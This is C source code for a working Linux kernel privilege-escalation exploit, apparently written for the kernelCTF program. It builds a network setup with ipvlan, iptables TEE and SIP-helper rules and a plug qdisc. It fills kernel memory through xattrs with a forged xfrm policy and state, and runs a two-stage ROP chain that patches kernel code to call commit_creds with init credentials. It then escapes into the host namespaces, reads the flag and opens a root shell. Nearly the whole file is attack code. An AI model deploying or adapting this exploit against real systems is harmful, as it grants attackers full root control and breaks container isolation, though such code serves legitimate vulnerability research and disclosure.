#define _GNU_SOURCE

#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <assert.h>
#include <sys/inotify.h>
#include <linux/xfrm.h>
#include <linux/pfkeyv2.h>

#include <linux/pkt_cls.h>

#include <linux/capability.h>
#include <linux/genetlink.h>
#include <linux/if_addr.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_packet.h>
#include <sys/xattr.h>
#include <err.h>
#include <sys/timerfd.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <pthread.h>
#include <linux/if_packet.h>
#include <netinet/tcp.h>
#include <linux/tls.h>
#include <linux/if_alg.h>
#include <math.h>
#include <linux/netfilter/xt_nfacct.h>

#include <linux/tc_act/tc_gact.h>
#include <linux/tc_act/tc_mirred.h>
#include <netlink/cli/utils.h>
#include <netlink/cli/tc.h>
#include <netlink/cli/class.h>
#include <netlink/cli/cls.h>
#include <netlink/cli/qdisc.h>
#include <netlink/cli/addr.h>
#include <netlink/cli/link.h>
#include <netlink/cli/route.h>
#include <netlink/route/tc.h>
#include <netlink/route/qdisc/htb.h>
#include <netlink/route/qdisc/plug.h>
#include <netlink/netfilter/nfnl.h>
#include <netlink/netfilter/log.h>
#include <netlink/netfilter/queue.h>
#include <linux/netfilter/nfnetlink_log.h>
#include <linux/filter.h>
#include <linux/ip.h>
#include <linux/udp.h>


#include "kernelver_16919.450.26.h"

static char *g_mmapped_buf;
static uint64_t g_kernel_text;


#ifdef DEBUG
#define err(errcode, msg, ...) \
        do { \
                perror(msg); \
                sleep(1000); \
        } while (0)
#define errx(errcode, msg, ...) \
        do { \
                puts(msg); \
                sleep(1000); \
        } while (0)
#endif


void set_cpu(int cpu)
{
        cpu_set_t cpus;
        CPU_ZERO(&cpus);      
        CPU_SET(cpu, &cpus);     
        if (sched_setaffinity(0, sizeof(cpu_set_t), &cpus) < 0) {
                perror("setaffinity");
                exit(1);
        }
}

void get_kctf_flag()
{
        char buf[512];


        int fd = open("/flag", O_RDONLY);

        if (fd < 0)
                return;

        size_t n = read(fd, buf, sizeof(buf));
        if (n > 0) {
                printf("Flag:\n");

                write(1, buf, n);

                printf("\n");
        }

        close(fd);
}

static char *g_sh_argv[] = {"sh", NULL};

static int g_status;

#define MMAP_SIZE 0x10000
#define XATTR_CHUNK 1000
#define XATTR_CNT 51000
/*
#define PAGE_OFFSET_BASE 0xffff888000000000
#define PAGE_OFFSET_BASE 0xffff943e80000000
*/

static uint64_t g_payload_location;
static uint64_t g_page_offset_base;

static int g_pwned;
static char *g_rop2;
static size_t g_rop2_len;

#define ROP2_CONST_AREA 0x10
#define ROP2_CONST_OFFSET 0x200

#define KOFFSET(x) (x-0xffffffff81000000uL)

uint64_t kaddr(uint64_t addr)
{
        return g_kernel_text + addr - 0xffffffff81000000uL;
}

void __attribute__((naked)) get_root()
{
        asm volatile(
                "push %r15\n"
                "push %r14\n"
                "push %r13\n"
                "push %r12\n"
                "push %rbx\n"
                "push %rbp\n"
                "lea -0x1838f1(%rip), %r15\n"
        );
        asm volatile(
                "lea (%%r15,%0), %%rdi\n"
                "lea (%%r15,%1), %%r12\n"
                "call *%%r12\n"
                :: 
                "r" (KOFFSET(INIT_CRED)),
                "r" (KOFFSET(COMMIT_CREDS))
        );
        asm volatile(
                "lea (%%r15,%0), %%r12\n"
                "call *%%r12\n"
                :: 
                "r" (KOFFSET(AUDIT_SYSCALL_EXIT))
        );

        asm volatile(
                "lea (%%r15,%0), %%r12\n"
                "mov $1, %%rdi\n"
                "call *%%r12\n"
                "mov %%rax, %%r13\n"
                :: 
                "r" (KOFFSET(FIND_TASK_BY_VPID))
        );

        asm volatile(
                "movq 0x780(%%r13), %%r14\n"
// increase nsproxy->refcnt
                "movq $0x10, (%%r14)\n"
                "lea (%%r15,%0), %%rsi\n"
                "mov %%r13, %%rdi\n"
                "lea (%%r15,%1), %%r12\n"
                "call *%%r12\n"
                :: 
                "r" (KOFFSET(INIT_NSPROXY)),
                "r" (KOFFSET(SWITCH_TASK_NAMESPACES))
        );

        asm volatile(
                "lea (%%r15,%0), %%rax\n"
                "pop %%rbp\n"
                "pop %%rbx\n"
                "pop %%r12\n"
                "pop %%r13\n"
                "pop %%r14\n"
                "pop %%r15\n"
                "jmp *%%rax\n"
                :: 
                "r" (KOFFSET(RETURN_THUNK))
        );

}

void reboot()
{
        int fd = open("/proc/sysrq-trigger", O_WRONLY);
        write(fd, "b", 1);
        close(fd);
}

void __attribute__((naked)) after_pwn()
{
        g_pwned = 1;

        set_cpu(1);

        int pid = fork();

        if (!pid) {

        if (setns(open("/proc/1/ns/mnt", O_RDONLY), 0) < 0)
                perror("setns");

        setns(open("/proc/1/ns/pid", O_RDONLY), 0);
        setns(open("/proc/1/ns/net", O_RDONLY), 0);

        if (access("/proc/vmallocinfo", R_OK)) {
                printf("Exploit failed!\n");
                exit(1);
        }
        printf("\nGot root!!!\n");
        printf("Getting kctf flags ...\n");

        get_kctf_flag();

// Force reboot to avoid hangs of the repro system
        sleep(5);
        reboot();

        printf("Launching shell, system will crash when you exit because I didn't bother with recovery ...\n");
        execve("/bin/sh", g_sh_argv, NULL);
        _exit(0);
        }

        waitpid(pid, &g_status, 0);

       

        printf("Shell exited, sleeping for 30 seconds, after that system might crash\n");

        sleep(30);
        _exit(0);
}


void rop_rax2rdi(uint64_t **rop_p)
{
        uint64_t *rop = *rop_p;

        *(uint64_t *) (g_rop2+ROP2_CONST_OFFSET) = kaddr(POP_RDI); // RCX == RW_BUFFER 

// rax -> rdi
        *rop++ = kaddr(POP_RCX);
        *rop++ = kaddr(RW_BUFFER+ROP2_CONST_OFFSET); 
        *rop++ = kaddr(PUSH_RAX_JMP_QWORD_RCX);

        *rop_p = rop;
}

void rop_patch_kernel_code(uint64_t **rop_p, uint64_t dst, uint64_t src, size_t len)
{
        uint64_t *rop = *rop_p;
        *rop++ = kaddr(POP_RDI);
        *rop++ = dst & (~0xfff);
        *rop++ = kaddr(POP_RSI);
        *rop++ = 1;
        *rop++ = kaddr(SET_MEMORY_RW);

        *rop++ = kaddr(POP_RDI_RSI_RDX_RCX);
        *rop++ = dst;
        *rop++ = src;
        *rop++ = len;
        *rop++ = 0xdeadbeef;
        *rop++ = kaddr(COPY_USER_GENERIC_STRING);

        *rop_p = rop;
}

size_t prepare_rop2(uint64_t *rop2)

{
        uint64_t *rop2_start = rop2;

        rop_patch_kernel_code(&rop2, kaddr(SYS_KEXEC_FILE_LOAD), (uint64_t) get_root, 0x200);

        *rop2++ = kaddr(POP_RDI);
        *rop2++ = 10000000;       
        *rop2++ = kaddr(MSLEEP);

        return (char *) rop2 - (char *) rop2_start;
}


/* Netlink code based on syzcaller generated snippets */
struct nlmsg {
        char* pos;
        int nesting;
        struct nlattr* nested[8];
        char buf[0x30000];
};

static void netlink_init(struct nlmsg* nlmsg, int typ, int flags,
                         const void* data, int size)
{
        memset(nlmsg, 0, sizeof(*nlmsg));
        struct nlmsghdr* hdr = (struct nlmsghdr*)nlmsg->buf;
        hdr->nlmsg_type = typ;
        hdr->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | flags;
        memcpy(hdr + 1, data, size);
        nlmsg->pos = (char*)(hdr + 1) + NLMSG_ALIGN(size);
}

static void netlink_attr(struct nlmsg* nlmsg, int typ, const void* data,
                         int size)
{
        struct nlattr* attr = (struct nlattr*)nlmsg->pos;
        //        printf("attr size: %d\n", size);

        attr->nla_len = sizeof(*attr) + size;

        if (nlmsg->pos - nlmsg->buf + attr->nla_len  > sizeof(nlmsg->buf))
                errx(1, "Netlink buffer overflow, increase size in struct nlmsg\n");

        attr->nla_type = typ;
        if (size > 0)
                memcpy(attr + 1, data, size);
        nlmsg->pos += NLMSG_ALIGN(attr->nla_len);
}

static int netlink_send_ext(struct nlmsg* nlmsg, int sock, uint16_t reply_type,
                            int* reply_len, bool dofail)
{
        if (nlmsg->pos > nlmsg->buf + sizeof(nlmsg->buf) || nlmsg->nesting)
                err(1, "netlink_send_ext error");

        struct nlmsghdr* hdr = (struct nlmsghdr*)nlmsg->buf;
        hdr->nlmsg_len = nlmsg->pos - nlmsg->buf;

        struct sockaddr_nl addr;
        memset(&addr, 0, sizeof(addr));
        addr.nl_family = AF_NETLINK;

        ssize_t n = sendto(sock, nlmsg->buf, hdr->nlmsg_len, 0,
                     (struct sockaddr*)&addr, sizeof(addr));

        if (n != (ssize_t)hdr->nlmsg_len) {
                if (dofail)
                        err(1, "netlink_send_ext error");
                return -1;
        }

        n = recv(sock, nlmsg->buf, sizeof(nlmsg->buf), 0);
        if (reply_len)
                *reply_len = 0;

        if (n < 0) {
                if (dofail)
                        err(1, "netlink_send_ext error");
                return -1;
        }
        if (n < (ssize_t)sizeof(struct nlmsghdr)) {
                errno = EINVAL;
                if (dofail)
                        err(1, "netlink_send_ext error");
                return -1;
        }
        if (hdr->nlmsg_type == NLMSG_DONE)
                return 0;

        if (reply_len && hdr->nlmsg_type == reply_type) {
                *reply_len = n;
                return 0;
        }
        if (n < (ssize_t)(sizeof(struct nlmsghdr) + sizeof(struct nlmsgerr))) {
                errno = EINVAL;
                if (dofail)
                        err(1, "netlink_send_ext error");
               return -1;
        }
        if (hdr->nlmsg_type != NLMSG_ERROR) {
                errno = EINVAL;
                if (dofail)
                        err(1, "netlink_send_ext error");
                return -1;
        }

        errno = -((struct nlmsgerr*)(hdr + 1))->error;
        return -errno;
}

static int netlink_send(struct nlmsg* nlmsg, int sock)
{
        return netlink_send_ext(nlmsg, sock, 0, NULL, false);
}

/* End of syzkaller code */


static struct nlmsg nlmsg;
struct nl_cache *g_link_cache;
static struct nl_sock *g_nl_sock;

static void netlink_device_change(struct nlmsg* nlmsg, int sock,
                                  const char* name, bool up, const char* master,
                                  const void* mac, int macsize,
                                  const char* new_name)
{
        struct ifinfomsg hdr;
        memset(&hdr, 0, sizeof(hdr));

        if (up)
                hdr.ifi_flags = hdr.ifi_change = IFF_UP;

        hdr.ifi_index = if_nametoindex(name);

        netlink_init(nlmsg, RTM_NEWLINK, 0, &hdr, sizeof(hdr));

        if (new_name)
                netlink_attr(nlmsg, IFLA_IFNAME, new_name, strlen(new_name));

        if (master) {
                int ifindex = if_nametoindex(master);
                netlink_attr(nlmsg, IFLA_MASTER, &ifindex, sizeof(ifindex));
        }

        if (macsize)
                netlink_attr(nlmsg, IFLA_ADDRESS, mac, macsize);

        netlink_send(nlmsg, sock);
}

int setup_namespaces()
{
        char *uid_map;
        char *gid_map;
        int ret, map;
        uid_t uid = getuid();
        uid_t gid = getgid();

        if (unshare(CLONE_NEWUSER|CLONE_NEWNET|CLONE_NEWNS)) {
                perror("unshare");
                exit(1);
        }

        map = open("/proc/self/setgroups", O_WRONLY);
        ret = write(map, "deny", 4);

        if (ret < 4) {
                perror("setgroups write");
                exit(1);
        }

        close(map);

        asprintf(&uid_map, "0 %d 1\n", uid);
        size_t len = strlen(uid_map);

        map = open("/proc/self/uid_map", O_WRONLY);
        
        ret = write(map, uid_map, len);

        if (ret < len) {
                perror("uid map write");
                exit(1);
        }
        close(map);

        asprintf(&gid_map, "0 %d 1\n", gid);
        map = open("/proc/self/gid_map", O_WRONLY);
        ret = write(map, gid_map, len);

        if (ret < len) {
                perror("gid map write");
                exit(1);
        }

        close(map);

        if (mount("tmpfs", "/run", "tmpfs", 0, NULL)) {
                perror("mount");
                exit(1);
        }

        if (mount("/tmp/x86_64-linux-gnu", "/usr/lib/x86_64-linux-gnu", "", MS_BIND, NULL)) {
                perror("mount");
                exit(1);
        }

}

static void setup_network(char *link_name)
{
        int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
        if (sock == -1)
                exit(1);

        netlink_device_change(&nlmsg, sock, "lo", true, 0, NULL, 0, link_name);

        close(sock);

        g_nl_sock = nl_cli_alloc_socket();
        nl_cli_connect(g_nl_sock, NETLINK_ROUTE);
        g_link_cache = nl_cli_link_alloc_cache(g_nl_sock);
}


void add_qdisc_plug(uint32_t handle, uint32_t parent, int action)
{
	struct rtnl_qdisc *qdisc;
	struct rtnl_tc *tc;
	int err, flags = 0;
	char *kind, *id = NULL;

        if (!action)
                flags = NLM_F_CREATE | NLM_F_EXCL | NLM_F_REPLACE;

	qdisc = nl_cli_qdisc_alloc();
	tc = (struct rtnl_tc *) qdisc;

        nl_cli_tc_parse_dev(tc, g_link_cache, "ipv0");

        if (parent)
                rtnl_tc_set_parent(tc, parent);
        else
                nl_cli_tc_parse_parent(tc, "root");

        if (!rtnl_tc_get_ifindex(tc))
                nl_cli_fatal(EINVAL, "You must specify a network device (--dev=XXX)");

        if (!rtnl_tc_get_parent(tc))
                nl_cli_fatal(EINVAL, "You must specify a parent");


        rtnl_tc_set_handle(tc, handle);

	rtnl_tc_set_kind(tc, "plug");


        if (!action)
                rtnl_qdisc_plug_set_limit(qdisc, 0x100000);
        else if (action == 2)
                rtnl_qdisc_plug_release_indefinite(qdisc);
        else
                rtnl_qdisc_plug_buffer(qdisc);


        if ((err = rtnl_qdisc_add(g_nl_sock, qdisc, flags)) < 0)
                nl_cli_fatal(EINVAL, "Unable to add qdisc: %s", nl_geterror(err));
}

int alloc_xattr_fd_attr(int fd, char *attr, size_t size, void *buf)
{
        int res = fsetxattr(fd, attr, buf, size - 32, XATTR_CREATE);
        if (res < 0) {
                err(1, "fsetxattr");
        }

        return fd;
}

int alloc_xattr_fd(int fd, unsigned int id, size_t size, void *buf)
{
        char *attr;

        asprintf(&attr, "security.%d", id);
        alloc_xattr_fd_attr(fd, attr, size, buf);

        return fd;
}

int send_packet()
{
        int ret, sock;
        struct sockaddr_in addr;
        struct sockaddr_ll my_addr;

        add_qdisc_plug(0x10000, 0, 0);
        add_qdisc_plug(0x10000, 0, 3);

        sock = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_IP));
        if (sock < 0)
                err(1, "packet socket");

        struct ifreq s_ifr;
        strcpy(s_ifr.ifr_name, "ipv1");

/* get interface index */
        if (ioctl(sock, SIOCGIFINDEX, &s_ifr) < 0)
                err(1, "ioctl");

/* fill sockaddr_ll struct to prepare binding */
        my_addr.sll_family = AF_PACKET;
        my_addr.sll_protocol = htons(ETH_P_IP);
        my_addr.sll_ifindex =  s_ifr.ifr_ifindex;
        my_addr.sll_halen = ETH_ALEN;

        char dstaddr[ETH_ALEN] = {0x88,0x88,0x88,0x88,0x88,0x88};
        memcpy(&my_addr.sll_addr, dstaddr, ETH_ALEN);

        memset(g_mmapped_buf, 0, 0x1000);

        struct iphdr *iph = (struct iphdr *) g_mmapped_buf;
        iph->protocol = IPPROTO_UDP;
        iph->saddr = inet_addr("10.77.77.1");
        iph->daddr = inet_addr("10.6.0.1");
        iph->id = 0;
        iph->tos = 0x99;
        iph->ihl = 5;

        struct udphdr *udph = (struct udphdr *) (iph+1);
        udph->source = 0x1111;
        udph->dest = 0x1160;
        udph->len = htons(1500 - 20);

        memset(udph+1, 'A', 0x1000);

// sk_policy
        *(uint64_t *) (g_mmapped_buf + 0x178) = g_payload_location;

        ret = sendto(sock, g_mmapped_buf, 1500, 0, (struct sockaddr *) &my_addr, sizeof(my_addr));
        if (ret < 0)
                perror("send");

        close(sock);
        add_qdisc_plug(0x10000, 0, 2);
}

void prepare_policy(char *policy)
{
        memset(policy, 0, 0x2000);
// xp_net
        *(uint64_t *) (policy) = g_payload_location + 0x300;
// refcnt
        *(uint32_t *) (policy + 0x40) = 1;
// if_id
        *(uint32_t *) (policy + 0x7c) = 0;

// mark
        *(uint32_t *) (policy + 0x80) = 0;
        *(uint32_t *) (policy + 0x84) = 0;

// selector.family
        *(uint16_t *) (policy + 0x88 + 0x28) = 2;
// selector.prefixlen_d
        *(uint8_t *) (policy + 0x88 + 0x2a) = 0xff;
// selector.prefixlen_s
        *(uint8_t *) (policy + 0x88 + 0x2b) = 0xff;

// type
        *(uint8_t *) (policy + 0x199) = 1;
// action
        *(uint8_t *) (policy + 0x19a) = 0;
// xfrm_nr
        *(uint8_t *) (policy + 0x19c) = 1;
// family
        *(uint16_t *) (policy + 0x19e) = 2;

// tmpl.id.daddr
        *(uint32_t *) (policy + 0x1a8 + 0) = inet_addr("10.6.0.1");
// tmpl.id.spi
        *(uint32_t *) (policy + 0x1a8 + 0x10) = 0;
// tmpl.id.proto
        *(uint32_t *) (policy + 0x1a8 + 0x14) =  IPPROTO_ESP;
// tmpl.saddr
        *(uint32_t *) (policy + 0x1a8 + 0x18) = inet_addr("10.77.77.1");
// tmpl.encap_family
        *(uint16_t *) (policy + 0x1a8 + 0x28) = 2;
// tmpl.reqid
        *(uint32_t *) (policy + 0x1a8 + 0x2c) = 0;

// struct net

// net.dst_ops
// net.dst_ops.gc
/*
0xffffffff81ca5ef4:     mov rax, qword ptr [rdi + 0xd8]
0xffffffff81ca5efb:     mov ebx, 1
0xffffffff81ca5f00:     test rax, rax
0xffffffff81ca5f03:     je 0xffffffff81ca5f1d
0xffffffff81ca5f05:     mov rsi, rdi
0xffffffff81ca5f08:     mov rcx, r14
0xffffffff81ca5f0b:     mov rdi, rbp
0xffffffff81ca5f0e:     mov rdx, r15
0xffffffff81ca5f11:     call    __x86_indirect_thunk_rax
*/

        g_rop2_len = prepare_rop2((uint64_t *) g_rop2);
        if (g_rop2_len > ROP2_CONST_OFFSET)
                err(1, "Stage 2 ROP size too big: %d > %d\n", g_rop2_len, ROP2_CONST_OFFSET);

// stage 1 rop start

        *(uint64_t *) (policy + 0x12c0 + 8) = kaddr(G1);
        *(uint64_t *) (policy + 0x12c0 + 0x10) = kaddr(POP_R11_R10_R9_R8_RDI_RSI_RDX_RCX);

        *(uint64_t *) (policy + 0x12c0 + 0x39) = kaddr(POP_RSP_RBP_RBX);

        uint64_t *rop = (uint64_t *) (policy + 0x12c0 + 0x58);
        
        *rop++ = kaddr(POP_RDI_RSI_RDX_RCX);
        *rop++ = kaddr(RW_BUFFER);
        *rop++ = (uint64_t) g_rop2;
        *rop++ = ROP2_CONST_OFFSET + ROP2_CONST_AREA;
        *rop++ = 0xdeadbeef;

        *rop++ = kaddr(COPY_USER_GENERIC_STRING);

        *rop++ = kaddr(POP_RSP);
        *rop++ = kaddr(RW_BUFFER);



// dst_entries
        *(uint32_t *) (policy + 0x12c0 + 0x98) = 0xffffffff;

        *(uint64_t *) (policy + 0x12c0 + 0xd8) = kaddr(PUSH_RSI_JMP_QWORD_RSI_39);

// net.state_bydst
        *(uint64_t *) (policy + 0x1150) = g_payload_location + 0x11f0;

        *(uint64_t *) (policy + 0x11f0) = g_payload_location + 0x1400 + 8;

// xfrm_state
// 
// refcnt
        *(uint32_t *) (policy + 0x1400 + 0x38) = 1;
// family
        *(uint16_t *) (policy + 0x1400 + 0xea) = 2;
// daddr
        *(uint32_t *) (policy + 0x1400 + 0x58) = inet_addr("10.7.0.1");
// proto
        *(uint8_t *) (policy + 0x1400 + 0x6c) = IPPROTO_ESP;

// selector.family
        *(uint16_t *) (policy + 0x1400 + 0x70 + 0x28) = 2;
// selector.prefixlen_d
        *(uint8_t *) (policy + 0x1400 + 0x70 +  0x2a) = 0xff;
// selector.prefixlen_s
        *(uint8_t *) (policy + 0x1400 + 0x70 + 0x2b) = 0xff;
//state 
        *(uint8_t *) (policy + 0x1400 + 0xc0 + 0x10) = 2;
}

int main(int argc, char **argv)
{
        int ret;

        printf("Using default kernel base, your chance is 1/512, good luck!\nTry providing leaked kernel base as argv[1]\n");

        g_kernel_text = 0xffffffff81000000uL;

        if (argc > 2 && (argv[2][0] == 'f' || argv[2][0] == '0')) {
                g_page_offset_base = strtoull(argv[2], NULL, 16);
        } else {
                g_page_offset_base = 0xffff888000000000L;
        }

        printf("Using page_offset_base 0x%lx\n", g_page_offset_base);

        setbuf(stdout, NULL);

        g_mmapped_buf = mmap(NULL, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0);
        if (g_mmapped_buf == MAP_FAILED) {
                perror("mmap");
                return 1;
        }

        memset(g_mmapped_buf, 0, MMAP_SIZE);


#define ROP2_MMAP_SIZE 0x4000
        g_rop2 = mmap(NULL, ROP2_MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE|MAP_LOCKED, -1, 0);
        if (g_rop2 == MAP_FAILED)
                err(1, "mmap");

        struct timeval time;
        gettimeofday(&time,NULL);

        srand((time.tv_sec * 1000) + (time.tv_usec / 1000));

        chdir("/tmp");

        system("objcopy --dump-section tools=tools.tar.gz /tmp/exp/exploit");
        system("tar -xpf tools.tar.gz");

        setup_namespaces();
        setup_network(NULL);

        set_cpu(0);

        system("./ip link add p1 type veth peer p2");
        system("./ip a add 10.1.1.1/24 dev p1");


        system("./ip a add 10.2.1.1/24 dev veth0");
        system("./ip link set up dev veth0");
        system("./ip link set up dev p1");

        system("./ip link add link p1 name ipv0 type ipvlan mode l3");
        system("./ip link add link p1 name ipv1 type ipvlan mode l3");
        system("./ip a add 10.3.0.1/24 dev ipv0");
        system("./ip a add 10.4.0.1/24 dev ipv1");
        system("./ip link set up mtu 400 dev ipv0");
        system("./ip link set up mtu 10000 dev ipv1");
        system("./ip ro add 10.7.0.0/16 dev ipv0");

        system("./iptables -t nat -A OUTPUT -o p1 -j DNAT --to-destination 10.7.0.1");

        system("./iptables -t mangle -A OUTPUT -o p1 -d 10.7.0.1 -m tos '!' --tos 6 -j TEE --gateway 10.4.0.10");
        system("./iptables -t mangle -A OUTPUT -o p1 -d 10.7.0.1 -j TOS --set-tos 6");
        system("./iptables -t raw -A OUTPUT -o p1 -p udp -d 10.7.0.1 -jCT --helper sip");

        g_link_cache = nl_cli_link_alloc_cache(g_nl_sock);

        int xfd = -1;
        unsigned int xattr_fd_idx = 0;
        char fname[512];

        g_payload_location = g_page_offset_base + 0x50000020;

        memset(g_mmapped_buf, 'A', 0x10000);

        prepare_policy(g_mmapped_buf);

        for (int i = 0; i < XATTR_CNT; i++)
        {
                if (i == 0 || (i / XATTR_CHUNK) > xattr_fd_idx) {
                        xattr_fd_idx = i / XATTR_CHUNK;
                        if ((i % 1000) == 0)
                                printf("xattrs %d/%d\n", i, XATTR_CNT);

                        snprintf(fname, sizeof(fname), "/tmp/x_%d", xattr_fd_idx);

                        xfd = open(fname, O_RDWR|O_CREAT, 0600);
                        if (xfd < 0)
                                err(1, "xattr open\n");
                }

                alloc_xattr_fd(xfd, i, 65535, g_mmapped_buf);
        }

        set_cpu(1);
        int pid = fork();

        if (pid) {
                set_cpu(0);
                int sock = send_packet();
                sleep(10000);
        }

        sleep(1);

        syscall(__NR_kexec_file_load);
        
        after_pwn();

// Can't exit, everything might crash
        while (1) 
                sleep(1000);

        return 0;
}
